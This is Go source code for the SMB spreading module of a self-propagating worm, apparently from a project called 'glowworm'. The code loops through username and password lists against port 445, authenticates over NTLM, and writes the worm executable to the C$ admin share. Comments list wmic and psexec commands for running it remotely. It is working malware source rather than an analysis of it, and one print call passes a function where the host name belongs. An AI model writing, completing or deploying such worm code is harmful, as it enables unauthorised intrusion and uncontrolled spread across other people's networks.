/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/glowworm
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

// Package vectors provides spreading mechanisms.
// This file implements the SMB spreading vector.

package vectors

import (
	"fmt"
	"net"
	"time"

	"github.com/hirochachacha/go-smb2"
)

// SMBVector spreads via Windows SMB shares.
//
// The attack sequence:
// 1. Connect to the target's SMB service (port 445)
// 2. Authenticate with username/password combinations
// 3. Copy the worm to the admin$ or C$ share
// 4. Execute remotely via WMI or PsExec-style
//
// This technique was famously used by WannaCry and NotPetya.
type SMBVector struct {
	// Config holds usernames, passwords, and timeouts
	Config Config

	// Port to connect to (default: 445)
	Port int

	// ShareName to write to (default: "C$")
	ShareName string

	// RemotePath within the share
	RemotePath string
}

// NewSMBVector creates an SMB vector with default settings.
func NewSMBVector() *SMBVector {
	return &SMBVector{
		Config:     DefaultConfig(),
		Port:       445,
		ShareName:  "C$",
		RemotePath: "Windows\\Temp\\glowworm.exe",
	}
}

// Name returns the vector identifier.
func (v *SMBVector) Name() string {
	return "smb"
}

// Check verifies if SMB is available on the target.
func (v *SMBVector) Check(target string) bool {
	addr := fmt.Sprintf("%s:%d", target, v.Port)

	conn, err := net.DialTimeout("tcp", addr, time.Duration(v.Config.Timeout)*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// Spread attempts to compromise the target via SMB.
//
// It tries authentication, uploads the payload to a share,
// and attempts remote execution.
func (v *SMBVector) Spread(target string, payload []byte) (bool, error) {
	// Try each username/password combination
	for _, user := range v.Config.Usernames {
		for _, pass := range v.Config.Passwords {
			if v.Config.DryRun {
				fmt.Printf("[DRY RUN] Would try SMB %s@%s with password '%s'\n", user, target, pass)
				continue
			}

			// Attempt connection and authentication
			session, err := v.connect(target, user, pass)
			if err != nil {
				continue // Wrong credentials, try next
			}

			// Success - we're in
			fmt.Printf("[SMB] Authenticated as %s@%s\n", user, target)

			// Upload the payload
			if err := v.uploadPayload(session, payload); err != nil {
				session.Logoff()
				return false, fmt.Errorf("upload failed: %w", err)
			}

			// Execute the payload
			if err := v.executePayload(target, user, pass); err != nil {
				// Non-fatal - payload is uploaded, might run later
				fmt.Printf("[SMB] Warning: execution failed: %v\n", err)
			}

			session.Logoff()
			return true, nil
		}
	}

	return false, fmt.Errorf("no valid credentials found")
}

// connect establishes an SMB session with the given credentials.
func (v *SMBVector) connect(target, user, pass string) (*smb2.Session, error) {
	addr := fmt.Sprintf("%s:%d", target, v.Port)

	conn, err := net.DialTimeout("tcp", addr, time.Duration(v.Config.Timeout)*time.Second)
	if err != nil {
		return nil, err
	}

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     user,
			Password: pass,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		conn.Close()
		return nil, err
	}

	return session, nil
}

// uploadPayload copies the worm to a network share.
func (v *SMBVector) uploadPayload(session *smb2.Session, payload []byte) error {
	// Mount the share
	share, err := session.Mount(v.ShareName)
	if err != nil {
		return fmt.Errorf("failed to mount share %s: %w", v.ShareName, err)
	}
	defer share.Umount()

	// Create/overwrite the file
	f, err := share.Create(v.RemotePath)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer f.Close()

	// Write the payload
	_, err = f.Write(payload)
	if err != nil {
		return fmt.Errorf("failed to write payload: %w", err)
	}

	fmt.Printf("[SMB] Uploaded payload to \\\\%s\\%s\\%s\n",
		session.Logoff, v.ShareName, v.RemotePath)

	return nil
}

// executePayload attempts to run the payload on the remote system.
//
// This uses WMI (Windows Management Instrumentation) to execute
// commands remotely. Requires admin privileges.
func (v *SMBVector) executePayload(target, user, pass string) error {
	// WMI execution would require additional implementation
	// For now, we rely on the payload being executed another way
	// (startup folder, scheduled task, etc.)

	// In a real worm, you might use:
	// - WMI: wmic /node:TARGET process call create "path\to\worm.exe"
	// - PsExec: psexec \\TARGET -u USER -p PASS path\to\worm.exe
	// - Services: Create a service that runs the payload
	// - Scheduled Tasks: Create a task to run immediately

	fmt.Printf("[SMB] Payload uploaded. Remote execution not implemented.\n")
	fmt.Printf("[SMB] The payload is at: C:\\%s\n", v.RemotePath)

	return nil
}
